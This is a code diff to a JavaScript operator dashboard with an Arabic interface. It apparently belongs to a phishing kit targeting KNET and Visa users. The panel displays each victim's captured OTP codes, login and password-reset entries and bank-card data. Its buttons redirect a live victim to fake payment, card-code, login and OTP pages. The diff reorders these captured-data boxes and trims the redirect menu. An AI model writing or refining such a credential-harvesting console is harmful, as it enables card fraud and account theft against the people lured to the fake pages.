@@ -793,22 +793,19 @@
     const otpsSectionHtml = sortedOtps.length ? `<div class="ref-otp-title"><h3>رموز التحقق (${sortedOtps.length})</h3></div>${sortedOtps.map((o, i) => `<article class="ref-otp-box"><div class="ref-otp-row"><div><b>الرمز ${i + 1}: <span class="ref-copyable" data-copy="${escapeHtml(String(o.otp || ''))}">${escapeHtml(String(o.otp || ''))}</span></b><time class="ref-box-time" data-box-counter data-box-time="${otpTime(o)}" datetime="${otpTime(o)}">${escapeHtml(formatRefTime(otpTime(o)))}</time></div><small>${escapeHtml(timeAgo(otpTime(o)))}</small></div></article>`).join('')}` : '';
     // ترتيب الصناديق من الأحدث إلى الأقدم (الأحدث يظهر في الأعلى).
     // صندوق المعلومات الأساسية يظهر دائماً حتى وإن لم يتوفر له وقت.
+    // الصناديق (ما عدا «معلومات أساسية») تُرتّب من الأحدث إلى الأقدم،
+    // وصندوق «معلومات أساسية» يبقى دائماً في الأسفل.
     const stackSections = [
-      { time: basicBoxTime, html: basicBoxHtml, always: true },
-      { time: toMillis(loginBoxTime), html: loginBoxesHtml, always: false },
-      { time: toMillis(resetBoxTime), html: resetBoxesHtml, always: false },
-      { time: cardsBoxTime, html: cardsSectionHtml, always: false },
-      { time: otpsBoxTime, html: otpsSectionHtml, always: false },
+      { time: toMillis(loginBoxTime), html: loginBoxesHtml },
+      { time: toMillis(resetBoxTime), html: resetBoxesHtml },
+      { time: cardsBoxTime, html: cardsSectionHtml },
+      { time: otpsBoxTime, html: otpsSectionHtml },
     ]
-      .filter(s => s.always || s.html)
-      .sort((a, b) => {
-        // الأحدث زمنياً في الأعلى؛ الصندوق بلا وقت ينزل للأسفل
-        if (b.time !== a.time) return b.time - a.time;
-        return (a.always ? 0 : 1) - (b.always ? 0 : 1);
-      })
+      .filter(s => s.html)
+      .sort((a, b) => (b.time || 0) - (a.time || 0))
       .map(s => s.html)
-      .join('');
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="loan">طلب سلفة</button><button data-ref-nav="shop">المتجر</button><button data-ref-nav="watch">طلب الساعة</button><button data-ref-nav="refund">طلب استرداد</button><button data-ref-nav="wait">صفحة الانتظار</button><button data-ref-nav="cart">سلة المشتريات</button><button data-ref-nav="knet">دفع كي نت</button><button data-ref-nav="verification">رمز كي نت</button><button data-ref-nav="card">دفع فيزا</button><button data-ref-nav="otp">رمز فيزا</button><button data-ref-nav="login">تسجيل الدخول</button><button data-ref-nav="forgot">نسيت كلمة المرور</button><button data-ref-nav="otpcode">رمز التحقق OTP</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="loan">طلب سلفة</option><option value="shop">المتجر</option><option value="watch">طلب الساعة</option><option value="refund">طلب استرداد</option><option value="wait">صفحة الانتظار</option><option value="cart">سلة المشتريات</option><option value="knet">دفع كي نت</option><option value="verification">رمز كي نت</option><option value="card">دفع فيزا</option><option value="otp">رمز فيزا</option><option value="login">تسجيل الدخول</option><option value="forgot">نسيت كلمة المرور</option><option value="otpcode">رمز التحقق OTP</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
+      .join('') + basicBoxHtml;
+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="wait">صفحة الانتظار</button><button data-ref-nav="cart">سلة المشتريات</button><button data-ref-nav="login">تسجيل الدخول</button><button data-ref-nav="forgot">نسيت كلمة المرور</button><button data-ref-nav="otpcode">رمز التحقق OTP</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="wait">صفحة الانتظار</option><option value="cart">سلة المشتريات</option><option value="login">تسجيل الدخول</option><option value="forgot">نسيت كلمة المرور</option><option value="otpcode">رمز التحقق OTP</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
